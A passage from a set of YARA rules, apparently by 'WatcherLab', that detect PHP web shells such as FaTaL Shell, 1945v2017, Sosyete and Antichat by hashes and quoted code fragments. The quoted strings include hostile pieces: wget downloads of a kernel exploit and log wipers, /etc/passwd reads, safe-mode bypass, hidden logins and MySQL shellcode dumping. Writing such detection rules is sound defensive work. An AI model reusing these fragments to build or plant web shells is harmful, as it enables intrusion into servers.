      $s11 = "e->FreeSpace).'&#13;Type:'.$DriveTypeDB[$drive->DriveType].'\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s12 = "makeinput(array('title'=>'Current file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));" fullword ascii
      $s13 = "if ($doing == 'login') {" fullword ascii
      $s14 = "p('<td width=\"2%\" nowrap><input type=\"checkbox\" value=\"1\" name=\"dl['.$filedb['server_link'].']\"></td>');" fullword ascii
      $s15 = "p('<a href=\"javascript:rename(\\''.$filedb['server_link'].'\\');\">Rename</a> | ');" fullword ascii
      $s16 = "m('Directory delete '.(deltree($thefile) ? basename($thefile).' success' : 'failed'));" fullword ascii
      $s17 = ".alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}" fullword ascii
      $s18 = ".alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}" fullword ascii
      $s19 = "makeinput(array('title'=>'Reference file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));" fullword ascii
      $s20 = "$key = ($prefix ? $admin['cookiepre'] : '').$key;" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _1__4__140748a2a279ced57c797f726dcb7ad9a65005e2_5bdae9780fa349f3b58c475985c13c012897bd61_7e594b9fa652d185c4b87ab7080f740f5d7_158
{
   meta:
      description = "php17 - from files 1 (4).php, 140748a2a279ced57c797f726dcb7ad9a65005e2.php, 5bdae9780fa349f3b58c475985c13c012897bd61.php, 7e594b9fa652d185c4b87ab7080f740f5d7eea2f.php, 9735037eae2f73171d007caca31fbfb6467850d5.php, a7b3b8a66367f3e61183f78bbb82556eb2c2e40b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052f0f91060fa3f6723bfe2c0cc469246b58af699cda72e2b57d2918b8d1f1e9"
      hash2 = "c929f266350e6b936ad98409beb09d99a46c174440b2cc294b1b6440b5dea350"
      hash3 = "af896e0ad20db413c0cc3b5a8cda278400c143b470de54f8ccdf6154592279fd"
      hash4 = "2e605821bf44cdf64b605ee38090f2e3d9807df8d30e8c1c2640a8f5b4471528"
      hash5 = "0a18abae4ed20eb3140925b78cce995a272b596f97191b1fb08024942ee7c854"
      hash6 = "6100c932ea14b9264bcf16b46893716650bf412b6c4ecd538b37e3205f7a2dcc"
   strings:
      $x1 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $s2 = "$query = 'SELECT spider FROM Spider_Temp_Tab INTO DUMPFILE \\''.$mpath.'\\';';" fullword ascii
      $s3 = "<input type=\"text\" name=\"gl\" value=\"templet|templets|default|editor|fckeditor.html\" style=\"width:500px;\" disabled>" fullword ascii
      $s4 = "11'=>'Process.GetProcesses','aspx" fullword ascii
      $s5 = "<li><a href=\"?s=o\" id=\"t_14\" onclick=\"switchTab('t_14')\" target=\"main\"> MYSQL" fullword ascii
      $s6 = "<li><a href=\"?s=n\" id=\"t_13\" onclick=\"switchTab('t_13')\" target=\"main\"> MYSQL" fullword ascii
      $s7 = "<li><a href=\"?s=m\" id=\"t_12\" onclick=\"switchTab('t_12')\" target=\"main\"> MYSQL" fullword ascii
      $s8 = "<li><a href=\"?s=g\" id=\"t_6\" onclick=\"switchTab('t_6')\" target=\"main\"> " fullword ascii
      $s9 = "4'=>'<%execute(request','asp" fullword ascii
      $s10 = "6'=>'execute session(','asp" fullword ascii
      $s11 = "@mysql_query('DROP TABLE Spider_Temp_Tab;',$conn);" fullword ascii
      $s12 = "body{background:threedface;font-family:\"Verdana\", \"Tahoma\", \"" fullword ascii
      $s13 = "$query = \"CREATE TABLE Spider_Temp_Tab (spider BLOB);\";" fullword ascii
      $s14 = "Str[5] = \"copy c:\\\\1.php d:\\\\2.php\";" fullword ascii
      $s15 = "<li><a href=\"?s=logout\" id=\"t_15\" onclick=\"switchTab('t_15')\"> " fullword ascii
      $s16 = "table{color:#000000;font-family:\"Verdana\", \"Tahoma\", \"" fullword ascii
      $s17 = "$MSG_TOP = 'LOGIN';" fullword ascii
      $s18 = "\",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}" fullword ascii
      $s19 = "case \"g\" : Exec_g(); break;" fullword ascii
      $s20 = "<textarea name=\"tcb\" id=\"tcb\" style=\"width:610px;height:100px;\"></textarea>';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _3d2c16ba66c49d6776818b38d56795304adf6f8c_41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289_159
{
   meta:
      description = "php17 - from files 3d2c16ba66c49d6776818b38d56795304adf6f8c.php, 41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bc4da237fd7e9d00ea56ae4842fc9f4a9bc2da44c0bef7c0ccaafc377a60f9ff"
      hash2 = "885838c306798d11ca317627a98d94c7c1c30522a6d5d6a0c897560919ed4ffe"
   strings:
      $s1 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - FaTaL Shell v1.0 - Edited By KingDefacer</title><meta http-equiv=\"Conte" ascii
      $s2 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - FaTaL Shell v1.0 - Edited By KingDefacer</title><meta http-equiv=\"Conte" ascii
      $s3 = "document.reqs.submit();\">| Shell </a></td><td><a href=\"#\" onclick=\"document.reqs.action.value='viewer';" fullword ascii
      $s4 = "<a href=\"http://alturks.com\">COPYRIGHT 2010 - Edited By KingDefacer <?=$version;?></a></td></tr></table></tr></td></table><?=$" ascii
      $s5 = "<a href=\"http://alturks.com\">COPYRIGHT 2010 - Edited By KingDefacer <?=$version;?></a></td></tr></table></tr></td></table><?=$" ascii
      $s6 = "| Edit File</a></td><td><a href=\"#\" onclick=\"document.reqs.action.value='upload';document.reqs.dir.value='<?=$dir;?>';" fullword ascii
      $s7 = "<a href=\"#\" onclick=\"document.reqs.action.value='shell';document.reqs.dir.value='<?=$dir;?>';" fullword ascii
      $s8 = "<form name='reqs' method='POST'><input name='action' type='hidden' value=''><input name='dir' type='hidden' value=''> <input na" fullword ascii
      $s9 = "n'].\" -o \".$_POST['filename'].\"\");break;}}}?> " fullword ascii
      $s10 = "<-Back |</a></td><td><a href=\"#\" onclick=\"history.forward();\"> Next->|</a></td></tr></table></td></tr></table><br>" fullword ascii
      $s11 = "document.reqs.submit();\">| Upload File</a></td><td><a href=\"#\" onclick=\"document.reqs.action.value='phpeval';" fullword ascii
      $s12 = "<table style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\"" fullword ascii
      $s13 = "inkfile.'\\';document.reqs.dir.value=\\''.$dir.'\\'; document.reqs.submit();\" title=\"Delete\">X</a></td></tr>'; " fullword ascii
      $s14 = "| Main Page</a></td><td><a href=\"#\" onclick=\"document.reqs.action.value='editor';document.reqs.file.value='<?=$file;?>';" fullword ascii
      $s15 = "bgcolor=\"#336600\" align=\"right\" colspan=\"2\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"><tr><td><table><tr><td>" fullword ascii
      $s16 = "$content.='<tr><td><a href=\"#\" onclick=\"document.reqs.action.value=\\'editor\\';document.reqs.dir.value=\\''.$dir.'\\'; docum" ascii
      $s17 = ".$_POST['filename'].\" -p \".$_POST['urldown'].\"\");break; case lynx:shell(which('lynx').\" -source \".$_POST['urldown'].\" > " ascii
      $s18 = "{case wget:shell(which('wget').\" \".$_POST['urldown'].\" -O \".$_POST['filename'].\"\");break; case fetch:shell(which('fetch')." ascii
      $s19 = "document.reqs.dir.value='<?=$dir;?>'; document.reqs.submit();\">" fullword ascii
      $s20 = "{case wget:shell(which('wget').\" \".$_POST['urldown'].\" -O \".$_POST['filename'].\"\");break; case fetch:shell(which('fetch')." ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_05311655a15b75fab86956663e1819cd_0ad17701cf5e5a59aa57f35aa240d9e40d28ba50_0b544ac96e173af1_160
{
   meta:
      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 05311655a15b75fab86956663e1819cd.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash3 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash4 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash5 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash6 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash7 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash8 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash9 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash10 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $x1 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
      $x2 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x3 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
      $x4 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)" fullword ascii
      $s5 = "<OPTION VALUE=\"which wget curl w3m lynx\">Downloaders?" fullword ascii
      $s6 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>\"><input type=hidden" ascii
      $s7 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER WITHOUT PASSWORD!" fullword ascii
      $s8 = "echo \"<form action=\\\"\".$surl.\"\\\"><input type=hidden name=act value=\\\"ftpquickbrute\\\"><br>Read first: <input type=text" ascii
      $s9 = "<div align=\"center\">Php Safe-Mode Bypass (Read Files)" fullword ascii
      $s10 = "<OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2" fullword ascii
      $s11 = "else {echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=feedback><b>Feedback or report bug (" ascii
      $s12 = "<center>Php Safe-Mode Bypass (List Directories):     <form action=\"<?php echo $surl; ?>\">" fullword ascii
      $s13 = "$tmpdir = \"\"; //Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)" fullword ascii
      $s14 = "File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>" ascii
      $s15 = "bool {break} - if TRUE and found match then break" fullword ascii
      $s16 = "<OPTION VALUE=\"netstat -atup | grep IST\">Open ports" fullword ascii
      $s17 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Write in /etc/?" fullword ascii
      $s18 = "height=\"1\"></td><td width=\"30%\" height=\"1\"></td><td width=\"30%\" height=\"1\"></td></tr></table><?php" fullword ascii
      $s19 = "$bindport_port = \"31373\"; // default port for binding" fullword ascii
      $s20 = "Warning. Kernel may be alerted using higher levels </div>" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c ) and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1945_v2017_1945v2017_meiFinal_161
{
   meta:
      description = "php17 - from files 1945-v2017.php, 1945v2017-meiFinal.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8180ca0fef742928d9f69887f9307d7a5764a64c716d3c96fd0b9aeee753affe"
      hash2 = "395bbabca853354b917d993a513bf0da82d3e7fbd3b75eb85f8e8e93205ae372"
   strings:
      $x1 = "$sysinfomerdekaee =\"<pre>\"; $sysinfomerdekaee.=$sysfo->uname().\"<br>\";$sysinfomerdekaee.=$sysfo->gethost().\"<br>\";$sysinfo" ascii
      $x2 = "s://facebook.com/JKT48.co\",\"shutdown57\",\"target=\\\"_blank\\\"\");$foot.= \"</div>\";return $foot;}}" fullword ascii
      $x3 = "class Html45{public function show($str){return print($str);}public function h1($t){$h= \"<h1>\";$h.= $t;$h.=\"</h1>\";return $h;" ascii
      $x4 = "}elseif($__action__ == \"sh\"){$cgidir=\"1945_cgi/\";@mkdir($cgidir,0755);$hta = \"OPTIONS Indexes Includes ExecCGI FollowSymLin" ascii
      $x5 = "{$cgidir=\"1945_cgi/\";@mkdir($cgidir,0755);$hta = \"OPTIONS Indexes Includes ExecCGI FollowSymLinks\\nAddType application/x-htt" ascii
      $x6 = "$hidden_login_uri = \"?login=1945\"; // login url , default : shell.php?login=1945" fullword ascii
      $s7 = "gi .id\\nAddHandler cgi-script .id\\nAddHandler cgi-script .id\";$source=$act->getcontent(\"https://raw.githubusercontent.com/al" ascii
      $s8 = "}elseif($GLOBALS['hidden_login'] === FALSE){LoginPage1945();exit();}else{echo \"hello there,shutdown57 !\"; exit();}" fullword ascii
      $s9 = "{echo \"<div style=\\\"margin-top:250px;\\\" align=center><h3>1945v2017 - Login</h3></div>\";echo \"<form method=\\\"POST\\\"><t" ascii
      $s10 = "{echo \"<div style=\\\"margin-top:250px;\\\" align=center><h3>1945v2017 - Login</h3></div>\";echo \"<form method=\\\"POST\\\"><t" ascii
      $s11 = "GET[$requri[0]]==$requri[1]){LoginPage1945();}}exit();" fullword ascii
      $s12 = "$hidden_login =TRUE; // Hidden login, TRUE or FALSE" fullword ascii
      $s13 = ">Done ... <a href='1945_cgi/cgi_shell.id' target='_blank'>Click here</a></h1></center>\");" fullword ascii
      $s14 = "$requri = explode(\"=\",str_replace(\"?\",\"\",$GLOBALS['hidden_login_uri']));" fullword ascii
      $s15 = "if($GLOBALS['hidden_login'] === TRUE){header('Status : 404');header('HTTP/1.0 404 Not Found');if(isset($_GET[$requri[0]])){if($_" ascii
      $s16 = "if($GLOBALS['hidden_login'] === TRUE){header('Status : 404');header('HTTP/1.0 404 Not Found');if(isset($_GET[$requri[0]])){if($_" ascii
      $s17 = "gi/cgi_telnet.id' target='_blank'>Click here</a></h1></center>\");" fullword ascii
      $s18 = "\\\"\").\" ]\");$li .= $html->li(\"[ \".$html->a(\"?__merdeka__=$dir&__action__=sh\",\"CGI Shell\",\"title=\\\"CGI Telnet - Bash" ascii
      $s19 = "function login_1945_merdekaataoemati(){" fullword ascii
      $s20 = "$userAgents = array(\"Googlebot\", \"Slurp\", \"MSNBot\", \"PycURL\", \"facebookexternalhit\",\"ia_archiver\", \"crawler\", \"Ya" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _10591d83ffb23715e09c6d48af27343f3085a10f_1d50c11fa28a19289aaa63a03e0abb371f825dca_162
{
   meta:
      description = "php17 - from files 10591d83ffb23715e09c6d48af27343f3085a10f.php, 1d50c11fa28a19289aaa63a03e0abb371f825dca.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8cb10acea18313eeaf291daa6928cc522ed698c58243dc257a7117ac64076d46"
      hash2 = "50bebed805e9e3b21d1d8c24501cc3bf29dea74081fd37d14258b5c40d1482a9"
   strings:
      $x1 = "<font face=\"Wingdings 3\" size=\"5\"></font><b>Sosyete Safe Mode Bypass Shell ; Bypass shell'lerden esinlenerek bir" fullword ascii
      $s2 = "<option value=\" \">Sosyete safe mode bypass shell</option>" fullword ascii
      $s3 = "<option value=\"cat /var/cpanel/accounting.log\">cat/var/cpanel/accounting.log</option>" fullword ascii
      $s4 = "<option value=\"netstat -an | grep -i listen\">A&#231;&#305;k Portlar</option>" fullword ascii
      $s5 = "<TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=" fullword ascii
      $s6 = "<TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgCol" fullword ascii
      $s7 = "echo \"<b><font color=red>Sosyete Bypass Main Menu</font></b><br>\";" fullword ascii
      $s8 = "</b><font face=\"Wingdings 3\" size=\"5\"></font><b><font color=\"#CC0000\">Sosyete Safe Mode Bypass Shell<span lang=\"en-us\"><" ascii
      $s9 = "<TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100" fullword ascii
      $s10 = "<BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style=" fullword ascii
      $s11 = "<option value=\"cat /etc/httpd/conf/httpd.conf\">cat/etc/httpd/conf/httpd.conf</option>" fullword ascii
      $s12 = "<option value=\"cat /etc/syslog.conf\">cat/etc/syslog.conf</option>" fullword ascii
      $s13 = "<option value=\"who -q\">Kullan&#305;c&#305; Say&#305;s&#305;</option>" fullword ascii
      $s14 = "<option value=\"cat /etc/hosts\">cat/etc/hosts</option>" fullword ascii
      $s15 = "<option value=\"cat /etc/passwd\">cat/etc/passwd</option>" fullword ascii
      $s16 = "<option value=\"ipconfig\">A&#287; Bilgisi</option>" fullword ascii
      $s17 = "</select> <input type=\"submit\" value=\"&#199;al&#305;&#351;t&#305;r\">" fullword ascii
      $s18 = "<option value=\"ps -aux\">Uygulamalar</option>" fullword ascii
      $s19 = "<option value=\"uname -a\">Server</option>" fullword ascii
      $s20 = "scrollbar-darkshadow-color: #101842;" fullword ascii
   condition:
      ( uint16(0) == 0x683c and filesize < 30KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1__4__140748a2a279ced57c797f726dcb7ad9a65005e2_34127df2be5061288e2863da49b977a4a025273f_3c7b93811ffd056b5952b80a517c10c2_54_163
{
   meta:
      description = "php17 - from files 1 (4).php, 140748a2a279ced57c797f726dcb7ad9a65005e2.php, 34127df2be5061288e2863da49b977a4a025273f.php, 3c7b93811ffd056b5952b80a517c10c2.php, 5425e9f71fca02fd3ac7a3ffa8dbd254afec8213.php, 55254f8f1d961c9a832cf2c3f7747b3e510efbdf.php, 5bdae9780fa349f3b58c475985c13c012897bd61.php, 6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87.php, 7e594b9fa652d185c4b87ab7080f740f5d7eea2f.php, 9735037eae2f73171d007caca31fbfb6467850d5.php, a7b3b8a66367f3e61183f78bbb82556eb2c2e40b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052f0f91060fa3f6723bfe2c0cc469246b58af699cda72e2b57d2918b8d1f1e9"
      hash2 = "c929f266350e6b936ad98409beb09d99a46c174440b2cc294b1b6440b5dea350"
      hash3 = "43411e7e750ebfe589cc4004da7b67e907c6f2cfe868a00962ff6b08b515e4c2"
      hash4 = "ea918b9d0452f99243cd726116e120d79a68c881cca87d1e467e72c646eff74a"
      hash5 = "0f7aad3e734d2a719d82358afda9ec240e8bd58999d0b76e75f3d5f4dda38985"
      hash6 = "80a13546c401bbf7495b74bfeb0d78d293dd5289b64b3af936cc00372daeacc2"
      hash7 = "af896e0ad20db413c0cc3b5a8cda278400c143b470de54f8ccdf6154592279fd"
      hash8 = "4713738198d1baac37ab2fb1b8906bc8c5e4f4eb064808a051ef89e003ed3f86"
      hash9 = "2e605821bf44cdf64b605ee38090f2e3d9807df8d30e8c1c2640a8f5b4471528"
      hash10 = "0a18abae4ed20eb3140925b78cce995a272b596f97191b1fb08024942ee7c854"
      hash11 = "6100c932ea14b9264bcf16b46893716650bf412b6c4ecd538b37e3205f7a2dcc"
   strings:
      $s1 = "if(found){txt.moveStart(\"character\", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}" fullword ascii
      $s2 = "<input type=\"text\" name=\"mhost\" value=\"{$mhost}\" style=\"width:110px\">" fullword ascii
      $s3 = "'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '" fullword ascii
      $s4 = "var reg = /^(\\\\d{1,4})(-|\\\\/)(\\\\d{1,2})\\\\2(\\\\d{1,2}) (\\\\d{1,2}):(\\\\d{1,2}):(\\\\d{1,2})$/; " fullword ascii
      $s5 = "<input type=\"text\" name=\"mpass\" value=\"{$mpass}\" style=\"width:110px\">" fullword ascii
      $s6 = "<input type=\"text\" name=\"muser\" value=\"{$muser}\" style=\"width:110px\">" fullword ascii
      $s7 = "<input type=\"text\" name=\"mport\" value=\"{$mport}\" style=\"width:110px\">" fullword ascii
      $s8 = "<input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.form);\"> " fullword ascii
      $s9 = "<textarea name=\"msql\" style=\"width:700px;height:200px;\">{$msql}</textarea></div>" fullword ascii
      $s10 = "<input type=\"text\" name=\"downfile\" value=\"{$downfile}\" style=\"width:500px\">" fullword ascii
      $s11 = "'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '" fullword ascii
      $s12 = "<input type=\"file\" name=\"upfile\" style=\"width:500px;height:22px;\">" fullword ascii
      $s13 = "<input type=\"text\" name=\"uppath\" value=\"{$uppath}\" style=\"width:500px\">" fullword ascii
      $s14 = "<input type=\"text\" name=\"mdata\" value=\"{$mdata}\" style=\"width:110px\">" fullword ascii
      $s15 = "<select onchange=\"return nFull(options[selectedIndex].value)\">" fullword ascii
      $s16 = "for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){" fullword ascii
      $s17 = "if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;" fullword ascii
      $s18 = "txt.moveStart(\"character\", 1);" fullword ascii
      $s19 = "else{if (n > 0){n = 0;search(str)}else alert(str + \"... Not-Find\")}" fullword ascii
      $s20 = "---> '.$ports[$i].'</font><br>' : '" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _0303e32c8e6674ec89356c9282eeac81606b4fb5_043c3d7e489c69b48737cc0c92d0f3a2_04edbee5e0a3cee384e464d05969bd89b0d32a52_0e634bcc_164
{
   meta:
      description = "php17 - from files 0303e32c8e6674ec89356c9282eeac81606b4fb5.php, 043c3d7e489c69b48737cc0c92d0f3a2.php, 04edbee5e0a3cee384e464d05969bd89b0d32a52.php, 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php, 2009mssql.php, 2011.php, 2011__2_.php, 49c50fe8a010c9849384328b5ca7738065be0a13.php, 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php, 6e43c4411972b54c6780f45d8863e08470f6a814.php, 82e9a1a1accef35ca21d1e7da20c851659596462.php, 8cb920e907d03c01ede32ca82469f2ec6b551746.php, a647275c30e0a1e78903680ea97931aa8cd39118.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php, angelbig.php, AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
      hash2 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
      hash5 = "f3f4f4806fca0d61da9e04cd730529f1424ef405581f424f669222f0b2ad1346"
      hash6 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash7 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
      hash8 = "1d4c1bc5afeca8d7755322dd900886f324e564d2969147bd90754438b63dab5f"
      hash9 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
      hash10 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
      hash11 = "34fcf9b17604d49903cbb33e49a1ea5983a65333d7fd5d67d3ec3b904aa40df6"
      hash12 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash13 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
      hash14 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash15 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash16 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
      hash17 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $s1 = "$arg['target'] = $arg['target'] ? \"target=\\\"$arg[target]\\\"\" : '';" fullword ascii
      $s2 = "function getPath($scriptpath, $nowpath) {" fullword ascii
      $s3 = "$array = @posix_getpwuid(@fileowner($filepath));" fullword ascii
      $s4 = "function getUser($filepath)" fullword ascii
      $s5 = "!$arg['method'] && $arg['method'] = 'post';" fullword ascii
      $s6 = "$arg['size'] = $arg['size'] > 0 ? \"size=\\\"$arg[size]\\\"\" : \"size=\\\"100\\\"\";" fullword ascii
      $s7 = "p(\"<form name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" action=\\\"$arg[action]\\\" method=\\\"$arg[method]\\\" $arg[target]>\")" ascii
      $s8 = "$dirdata[$j]['dirchmod']=getChmod($f);" fullword ascii
      $s9 = "$dirdata[$j]['dirperm']=getPerms($f);" fullword ascii
      $s10 = "function getChmod($filepath){" fullword ascii
      $s11 = "function getPerms($filepath) {" fullword ascii
      $s12 = "function getUpPath($nowpath) {" fullword ascii
      $s13 = "if (substr($nowpath, -1) != '/') {" fullword ascii
      $s14 = "function tbhead() {" fullword ascii
      $s15 = "$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';" fullword ascii
      $s16 = "return (false !== function_exists($funName)) ? 'Yes' : 'No';" fullword ascii
      $s17 = "return substr(base_convert(@fileperms($filepath),10,8),-4);" fullword ascii
      $s18 = "$dirdata[$j]['filename']=str_replace($nowpath,'',$f);" fullword ascii
      $s19 = "$onchange = 'onchange=\"'.$arg['onchange'].'\"';" fullword ascii
      $s20 = "$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Antichat_Shell_v1_3_2_Antichat_Shell_165
{
   meta:
      description = "php17 - from files Antichat-Shell-v1.3_2.php, Antichat-Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f86f79b08217680a4b03243e52d87eacd27045a36dc44b824022ed1674b4d59b"
      hash2 = "107264a7573cf1db946f6997395e6eb57586dc1eec5c37139e4affceb270889b"
   strings:
      $s1 = "<textarea readonly rows=\\\"15\\\" cols=\\\"150\\\">\" . @htmlspecialchars(shell($_POST['command'])) . \"</textarea><br>" fullword ascii
      $s2 = "if (@$_POST['login'] == $login && @$_POST['password'] == $password)" fullword ascii
      $s3 = "echo '<tr><td><a href=\"#\" onclick=\"document.reqs.action.value=\\'viewer\\'; document.reqs.dir.value=\\'' . $link . " fullword ascii
      $s4 = "// end downloader" fullword ascii
      $s5 = "echo '<a href=\"#\" onclick=\"document.reqs.action.value=\\'viewer\\'; document.reqs.dir.value=\\'' . chr($j) " fullword ascii
      $s6 = "echo '<center><table><form method=\"POST\"><tr><td>Login:</td><td><input type=\"text\" name=\"login\" value=\"\"></td></tr><tr><" ascii
      $s7 = "<textarea name=\\\"data\\\" rows=\\\"40\\\" cols=\\\"180\\\">\" . @readf($file) . \"</textarea><br>" fullword ascii
      $s8 = "<td><a href=\"http://antichat.ru\">COPYRIGHT BY ANTICHAT.RU <?php echo $version;?></a></td>" fullword ascii
      $s9 = "echo '<tr><td><a href=\"#\" onclick=\"document.reqs.action.value=\\'editor\\'; document.reqs.file.value=\\'' . $linkfi" fullword ascii
      $s10 = "onclick=\"document.reqs.action.value='shell'; document.reqs.submit();\">|" fullword ascii
      $s11 = "borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333" fullword ascii
      $s12 = "$file = $_SESSION['file'] = $_POST['file'];" fullword ascii
      $s13 = "$_SESSION['action'] = $_POST['action'];" fullword ascii
      $s14 = "$_SESSION['dir'] = $_POST['dir'];" fullword ascii
      $s15 = "it();\" title=\"Download\">D</a>" fullword ascii
      $s16 = "if (@$_POST['action'] == \"exit\")" fullword ascii
      $s17 = "// end shell" fullword ascii
